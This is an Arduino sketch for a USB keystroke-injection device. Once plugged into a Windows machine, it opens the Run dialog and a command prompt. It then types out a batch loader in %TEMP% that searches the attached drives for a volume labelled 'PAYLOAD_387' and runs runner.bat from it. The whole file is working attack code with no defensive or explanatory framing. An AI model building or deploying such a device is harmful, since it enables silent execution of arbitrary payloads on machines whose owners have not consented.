
void executeHotkey(char key1, char key2){
  Keyboard.press(key1);
  Keyboard.press(key2);
  delay(100);
  Keyboard.releaseAll();
}

void enterKey(){
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
}

void setup() {
  Serial.begin(9600); 
  
  // initialize control over the keyboard:
  Keyboard.begin();
}

void loop() {
  while (!Serial) {
    ; // wait for serial port to connect. Needed for native USB
  }
  
  //Wait for OS to recognise USB Device
  delay(6000);

  //Perform run-dialogue hotkey (WIN + r)
  executeHotkey(KEY_LEFT_GUI, 'r');

  delay(1000); //Wait for run dialogue to appear

  //Execute console
  Keyboard.println("cmd");

  delay(1000); //Wait for console to appear
  
  String loaderScriptFile = "%TEMP%\\loader.bat";
  String runnerScriptFile = "runner.bat";
  
  String cmdText = "echo :LOOP>"+loaderScriptFile;
  cmdText += "\n";
  cmdText += "echo for %%a in (d e f g h i j k l m n o p q r s t u v w x y z) do vol %%a: 2^>nul ^|find \"PAYLOAD_387\" ^>nul ^&^& set drv=%%a:>>"+loaderScriptFile;
  cmdText += "\n";
  cmdText += "echo IF [%drv%] == [] GOTO LOOP>>"+loaderScriptFile;
  cmdText += "\n";
  cmdText += "echo CALL %drv%\\"+runnerScriptFile+">>"+loaderScriptFile;
  cmdText += "\n";
  cmdText += "echo EXIT>>"+loaderScriptFile;
  cmdText += "\n";
  cmdText += "CALL \""+loaderScriptFile+"\"";
  
  Keyboard.println(cmdText);

  while(true){ }
}
